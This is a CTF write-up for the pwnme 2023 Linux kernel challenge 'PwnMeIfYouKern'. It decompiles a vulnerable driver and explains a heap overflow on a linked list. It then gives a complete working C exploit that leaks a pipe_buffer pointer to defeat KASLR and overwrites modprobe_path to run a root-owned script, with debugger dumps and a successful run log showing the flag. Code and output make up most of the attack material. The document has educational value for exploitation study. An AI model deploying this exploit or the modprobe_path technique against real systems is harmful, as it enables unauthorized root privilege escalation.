---
title: "[pwnme 2023 - pwn] PwnMeIfYouKern"
date: 2023-09-05
tags: ["ctf", "tek", "linux", "kernel"]
---

PwnMeIfYouKern was a linux kernel exploitation challenge from pwnme 2023.

There were no SMAP or SMEP, but KASLR was activated.
```sh
user@PwnMeIfYouKern:~$ cat /proc/cpuinfo | grep sm.p
user@PwnMeIfYouKern:~$ cat /proc/cmdline
console=ttyS0 loglevel=3 oops=panic panic=1 kaslr
user@PwnMeIfYouKern:~$ cat /proc/sys/vm/mmap_min_addr
4096
```

## TL;DR
- we manipulate elements from a linked list
- each element contains a buffer, his size, and a pointer to the next element of
the list
- there is a buffer overflow, we can change the size of the buffer to leak data,
and overwrite the pointer to the next element to get an arbitrary read/write
- break kaslr by leaking a `pipe_buffer` structure
- overwrite `modprobe_path`
- enjoy

## Reverse engineering

Here is the `write` function :
```c
size_t __fastcall pwnmeifyoukern_write(int u_fd, char *u_buf, size_t u_count)
{
  arg_t *arg; // rax MAPDST
  int want_new_item; // edx
  int idx; // ecx
  item_t *target; // rax
  item_t *new_item; // rax
  item_t *head; // rdx

  printk(&unk_3AD);
  arg = (arg_t *)_kmalloc(u_count, 3264LL);
  if ( !arg )
    return -12LL;
  if ( u_count > 0x7FFFFFFF || copy_from_user(arg, u_buf, u_count) )
  {
    kfree(arg);
    return -14LL;
  }
  want_new_item = arg->want_new_item;
  if ( arg->want_new_item )
  {
    if ( want_new_item == 1 )
    {
      new_item = (item_t *)_kmalloc(u_count + 0x10C, 3264LL);
      if ( !new_item )
      {
        kfree(arg);
        return -12LL;
      }
      ++list.nb_items;
      qmemcpy(new_item, &arg->idx, u_count - 4);// when want_new_item == 1, there is no arg->idx, the buffer is at arg+4 (in place of idx)
      new_item->size = u_count - 4;
      head = list.head;
      list.head = new_item;
      new_item->next = head;                    // insert at the beginning of the list
      goto end;
    }
err:
    kfree(arg);
    return -22LL;
  }
  idx = arg->idx;
  if ( idx < 0 || (unsigned __int64)idx >= list.nb_items )
    goto err;
  target = list.head;
  while ( want_new_item != idx )
  {
    target = target->next;
    ++want_new_item;
  }
  qmemcpy(target, arg->buf, u_count - 8);       // buffer overflow
  target->size = u_count - 8;
end:
  kfree(arg);
  return u_count;
}
```

When we ask for a new item, the module reads from user a structure like this one
:
```c
struct arg_t {
  int want_new_item;
  char buf[1]; // user-defined size
};
```

It then allocates a new structure of size `u_count + 0x10C`, it is the new
element of the list, and copies the user buffer into this new element.

Here is the structure of an element :
```c
struct item_t {
  char buf[256];
  __int64 size;
  item_t *next;
  char padding[u_count-4]; // wtf
};
```

As you can see, `buf` is a fixed size buffer of 256 bytes. We can copy an
arbitrary sized buffer into it so we can overwrite `size` and `next`. However,
we can not overflow on an adjacent structure, and the `size` is updated according
to our input buffer. Therefore we are only able to control the `next` member,
giving us arbitrary read/write primitives.

The new element is inserted at the beginning of the linked list.

If we call the write function without `want_new_item` set to 1, it expects a
structure such as :
```c
struct arg_t {
  int want_new_item;
  int idx;
  char buf[1]; // user-defined size
};
```

So, we can specify the index of the element we want to edit, the function then
copies the whole buffer to the already existing element without checking that
the size of the new buffer is less than the size of the existing element's
buffer. There is a buffer overflow and we can overflow on the following
structures. The size of the element is updated to suit the size of our input
buffer, so we can not leak data by just submitting a large buffer as we would
overwrite the data. 

The `read` function is pretty simple.
```c
__int64 __fastcall pwnmeifyoukern_read(int u_fd, char *u_buf, size_t u_count)
{
  __int64 nb_copied; // rbx
  item_t *head; // r14
  unsigned __int64 i; // rcx MAPDST
  unsigned __int64 item_size; // r13

  nb_copied = 0LL;
  printk(&unk_3C8);
  head = list.head;
  for ( i = 0LL; i < list.nb_items; ++i )
  {
    item_size = head->size;
    if ( u_count < nb_copied + item_size )
      item_size = u_count - nb_copied;
    if ( item_size >= 0x80000000 || copy_to_user(&u_buf[nb_copied], head, item_size, i, 0x80000000LL) )
      return -14LL;
    nb_copied += item_size;
    if ( u_count == nb_copied )
      break;
    head = head->next;
  }
  return nb_copied;
}
```

It just copies `u_count` bytes to the user buffer. If the first element contains
less than `u_count` bytes, it will read the buffer of the first element, the one
of the second element, and so on, until it reads `u_count` bytes.

We saw that we can overwrite the size of an element, as well as the `next`
pointer. So we have an out of bounds read and an arbitrary read.

## Exploitation
First of all, we create an item and update its size to leak a coming structure.
```c
memset(buf, 'A', BUF_SIZE);
new_item(buf, 0x100); // A

// change A.size
memset(buf, 0, BUF_SIZE);
memset(buf, 'A', 0x100);
*(unsigned long long *)(buf + 0x100) = 0x1337; // size (will be overwritten
*(unsigned long long *)(buf + 0x108) = NULL;  // next
edit_item(0, buf, 0x400+0x30); // new size
```
I have choosen to target `kmalloc-1024` (`0x100 + 0x10c = 0x20c = 524`) because
there were no allocation on this cache which makes my exploit more reliable.

As a target structure to leak, I have choosen a `struct pipe_buffer` (thanks to
https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#bypassing-kaslrsmep)
as it fits in `kmalloc-1024` and contains a pointer to a structure in the
`.data` segment, allowing us to leak the kernel base address.

```C
// spray with pipe_buffer
// https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c
printf("[*] Spraying pipe_buffer objects...\n");
for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (pipe(pipefd[i]) < 0) {
        err("pipe");
    }
    // Write something to populate pipe_buffer.
    if (write(pipefd[i][1], "pwn", 3) < 0) {
        err("pipe write");
    }
}
```

This gives us the following heap layout :

![Heap layout after spraying `with pipe_buffer` objects.](img/heap_layout.png)

We now have to read 0x418 bytes to leak `pipe_buffer.ops` and break KASLR.

```c
// read A and leak pipe_buffer.ops
memset(buf, 0, BUF_SIZE);
n = read(fd, buf, 0x400 + 0x30);
if (-1 == n) {
    err("read");
}
//hex_view(buf, n);

leak = *(unsigned long long *)(buf + 0x400 + 0x10);
kbase = leak - (0xffffffffa8210840 - 0xffffffffa7a00000);
modprobe_path = kbase + (0xffffffff89251a00 - 0xffffffff88800000);

printf("[+] pipe_buffer.ops = %p\n", leak);
printf("[+] kbase = %p\n", kbase);
printf("[+] modprobe_path @ %p\n", modprobe_path);
```

Now that we have the kernel base address, I have choosen to overwrite
`modprobe_path` as it is a fast and easy way to privesc. We could also make
the kernel executes `commit_creds(prepare_creds())` by overwritting
`pipe_buffer.ops` with a userland pointer to execute our own functions as there
is no SMAP or SMEP, but by overwritting `modprobe_path`, our exploit will work
even with these protections enabled.

We will use the first buffer overflow to overwrite the `next` pointer with
`modprobe_path`. We have to create a new item before overwritting the `next`
field in order to have 2 elements in the linked list :

```c
memset(buf, 'A', BUF_SIZE);
new_item(buf, 0x100); // B -> A


// B.next = modprobe_path
memset(buf, 0, BUF_SIZE);
*(unsigned long long *)(buf + 0x108) = modprobe_path;
edit_item(0, buf, 0x110);

// overwrite modprobe_path
strncpy(buf, "/home/user/pld", BUF_SIZE);
edit_item(1, buf, strlen(buf) + 1);
```

Unfortunately for us, there are two pointers at `modprobe_path+0x100` and we
just overwrote them, making the kernel panics when executing the file starting
with an unknown magic number.

```
gef➤  tel 0xffffffff92a51a00 -l 40
0xffffffff92a51a00│+0x0000: "/sbin/modprobe"
0xffffffff92a51a08│+0x0008: 0x000065626f727064 ("dprobe"?)
0xffffffff92a51a10│+0x0010: 0x0000000000000000
0xffffffff92a51a18│+0x0018: 0x0000000000000000
0xffffffff92a51a20│+0x0020: 0x0000000000000000
0xffffffff92a51a28│+0x0028: 0x0000000000000000
0xffffffff92a51a30│+0x0030: 0x0000000000000000
0xffffffff92a51a38│+0x0038: 0x0000000000000000
0xffffffff92a51a40│+0x0040: 0x0000000000000000
0xffffffff92a51a48│+0x0048: 0x0000000000000000
0xffffffff92a51a50│+0x0050: 0x0000000000000000
0xffffffff92a51a58│+0x0058: 0x0000000000000000
0xffffffff92a51a60│+0x0060: 0x0000000000000000
0xffffffff92a51a68│+0x0068: 0x0000000000000000
0xffffffff92a51a70│+0x0070: 0x0000000000000000
0xffffffff92a51a78│+0x0078: 0x0000000000000000
0xffffffff92a51a80│+0x0080: 0x0000000000000000
0xffffffff92a51a88│+0x0088: 0x0000000000000000
0xffffffff92a51a90│+0x0090: 0x0000000000000000
0xffffffff92a51a98│+0x0098: 0x0000000000000000
0xffffffff92a51aa0│+0x00a0: 0x0000000000000000
0xffffffff92a51aa8│+0x00a8: 0x0000000000000000
0xffffffff92a51ab0│+0x00b0: 0x0000000000000000
0xffffffff92a51ab8│+0x00b8: 0x0000000000000000
0xffffffff92a51ac0│+0x00c0: 0x0000000000000000
0xffffffff92a51ac8│+0x00c8: 0x0000000000000000
0xffffffff92a51ad0│+0x00d0: 0x0000000000000000
0xffffffff92a51ad8│+0x00d8: 0x0000000000000000
0xffffffff92a51ae0│+0x00e0: 0x0000000000000000
0xffffffff92a51ae8│+0x00e8: 0x0000000000000000
0xffffffff92a51af0│+0x00f0: 0x0000000000000000
0xffffffff92a51af8│+0x00f8: 0x0000000000000000
0xffffffff92a51b00│+0x0100: 0xffffffff92a51b00  →  [loop detected]
0xffffffff92a51b08│+0x0108: 0xffffffff92a51b00  →  0xffffffff92a51b00  →  [loop
detected]
0xffffffff92a51b10│+0x0110: 0x0000000000000032 ("2"?)
```

So we have to make a backup of this memory area, then overwrite `modprobe_path`
and rewrite the backup.

```c
memset(buf, 'A', BUF_SIZE);
new_item(buf, 0x100); // B -> A


// B.next = modprobe_path
memset(buf, 0, BUF_SIZE);
*(unsigned long long *)(buf + 0x108) = modprobe_path;
edit_item(0, buf, 0x110);

// leak [modprobe_path; modprobe_path + 0x108] to prevent panic
memset(bak, 0, sizeof(bak));
n = read(fd, bak, 0x110 + 0x108);
if (-1 == n) {
    err("read");
}
//hex_view(bak, n);

// overwrite modprobe_path
strncpy(buf, "/home/user/pld", BUF_SIZE);
edit_item(1, buf, strlen(buf) + 1);

// B.next = modprobe_path + 0x20
memset(buf, 0, BUF_SIZE);
*(unsigned long long *)(buf + 0x108) = modprobe_path + 0x20;
edit_item(0, buf, 0x110);

// prevent panic
memmove(bak, bak+0x110+0x20, 0x108-0x20);
edit_item(1, bak, 0x108-0x20);
```

We just need to create the script `/home/user/pld` that will be executed with
the root user and to execute a file containing an unknown magic number to
trigger to execution of `/home/user/pld` :

```c
puts("[+] getting a shell :)");
system("echo '#!/bin/sh\nchmod -R 777 /passwd' > /home/user/pld");
system("echo -e '\xef\xbe\xad\xde' > /home/user/x");
system("chmod 777 /home/user/pld /home/user/x");
system("/home/user/x");
```

To upload the exploit binary on the remote server and minimize it we can compile
it using `musl-gcc`, then `gzip` and `base64` it.

---

```
user@PwnMeIfYouKern:~$ ls -la /passwd
total 4
drwxr-xr-x    2 root     0                0 May  5 21:55 .
drwxr-xr-x   14 user     1000             0 May  9 22:46 ..
-rw-------    1 root     0               17 May  5 21:55 passwd
user@PwnMeIfYouKern:~$ cat /passwd/passwd
cat: can't open '/passwd/passwd': Permission denied
user@PwnMeIfYouKern:~$ /exploit
[*] Spraying pipe_buffer objects...
[+] pipe_buffer.ops = 0xffffffffa2810840
[+] kbase = 0xffffffffa2000000
[+] modprobe_path @ 0xffffffffa2a51a00
[+] getting a shell :)
/home/user/x: line 1: ﾭ: not found
user@PwnMeIfYouKern:~$ ls -la /passwd/passwd
-rwxrwxrwx    1 root     0               17 May  5 21:55 /passwd/passwd
user@PwnMeIfYouKern:~$ cat /passwd/passwd
PWNME{dummyflag}
```

## Full exploit
Here is the full exploitation code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>

#define err(msg) do { perror(msg); exit(-1); } while (0);

#define BUF_SIZE 0x1000
#define NUM_PIPEFDS 0x1

int fd;

struct arg_new {
    int new_item;
    char buf[0];
};

struct arg_edit {
    int new_item;
    int idx;
    char buf[0];
};

void hex_view(char *buf, size_t size) {
    for (int i = 0; i < size; i++) {
        if ((i % 0x10) == 0) {
            printf("%08x:", i);
        }
        printf(" %02hhx", buf[i]);
        if ((i % 0x10) == 0xf) {
            printf("\n");
        }
    }
    printf("\n");
}

void new_item(char *buf, size_t size) {
    struct arg_new *arg = calloc(1, sizeof(struct arg_new) + size);
    arg->new_item = 1;
    memcpy(arg->buf, buf, size);

    //hex_view(arg, sizeof(struct arg_new) + size);
    if (-1 == write(fd, arg, sizeof(struct arg_new) + size)) {
        err("write new item");
    }

    free(arg);
}

void edit_item(int idx, char *buf, size_t size) {
    struct arg_edit *arg = calloc(1, sizeof(struct arg_edit) + size);
    arg->new_item = 0;
    arg->idx = idx;
    memcpy(arg->buf, buf, size);

    //hex_view(arg, sizeof(struct arg_edit) + size);
    if (-1 == write(fd, arg, sizeof(struct arg_edit) + size)) {
        err("write edit item");
    }

    free(arg);
}



int main() {
    char *buf = malloc(BUF_SIZE);
    void *leak, *kbase, *modprobe_path;
    int n;
    char bak[0x400] = {0};
    int pipefd[NUM_PIPEFDS][2];

    fd = open("/dev/pwnmeifyoukern", O_RDWR);
    if (-1 == fd) {
        err("open");
    }

    memset(buf, 'A', BUF_SIZE);
    new_item(buf, 0x100); // A

    // change A.size
    memset(buf, 0, BUF_SIZE);
    memset(buf, 'A', 0x100);
    *(unsigned long long *)(buf + 0x100) = 0x1337; // size (will be overwritten)
    *(unsigned long long *)(buf + 0x108) = NULL;  // next
    edit_item(0, buf, 0x400+0x30); // new size


    // spray with pipe_buffer
    // https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c
    printf("[*] Spraying pipe_buffer objects...\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            err("pipe");
        }
        // Write something to populate pipe_buffer.
        if (write(pipefd[i][1], "pwn", 3) < 0) {
            err("pipe write");
        }
    }


    // read A and leak pipe_buffer.ops
    memset(buf, 0, BUF_SIZE);
    n = read(fd, buf, 0x400 + 0x30);
    if (-1 == n) {
        err("read");
    }
    //hex_view(buf, n);

    leak = *(unsigned long long *)(buf + 0x400 + 0x10);
    kbase = leak - (0xffffffffa8210840 - 0xffffffffa7a00000);
    modprobe_path = kbase + (0xffffffff89251a00 - 0xffffffff88800000);

    printf("[+] pipe_buffer.ops = %p\n", leak);
    printf("[+] kbase = %p\n", kbase);
    printf("[+] modprobe_path @ %p\n", modprobe_path);


    memset(buf, 'A', BUF_SIZE);
    new_item(buf, 0x100); // B -> A


    // B.next = modprobe_path
    memset(buf, 0, BUF_SIZE);
    *(unsigned long long *)(buf + 0x108) = modprobe_path;
    edit_item(0, buf, 0x110);

    // leak [modprobe_path; modprobe_path + 0x108] to prevent panic
    memset(bak, 0, sizeof(bak));
    n = read(fd, bak, 0x110 + 0x108);
    if (-1 == n) {
        err("read");
    }
    //hex_view(bak, n);

    // overwrite modprobe_path
    strncpy(buf, "/home/user/pld", BUF_SIZE);
    edit_item(1, buf, strlen(buf) + 1);

    // B.next = modprobe_path + 0x20
    memset(buf, 0, BUF_SIZE);
    *(unsigned long long *)(buf + 0x108) = modprobe_path + 0x20;
    edit_item(0, buf, 0x110);

    // prevent panic
    memmove(bak, bak+0x110+0x20, 0x108-0x20);
    edit_item(1, bak, 0x108-0x20);


    puts("[+] getting a shell :)");
    system("echo '#!/bin/sh\nchmod -R 777 /passwd' > /home/user/pld");
    system("echo -e '\xef\xbe\xad\xde' > /home/user/x");
    system("chmod 777 /home/user/pld /home/user/x");
    system("/home/user/x");

    close(fd);

    return 0;
}
```
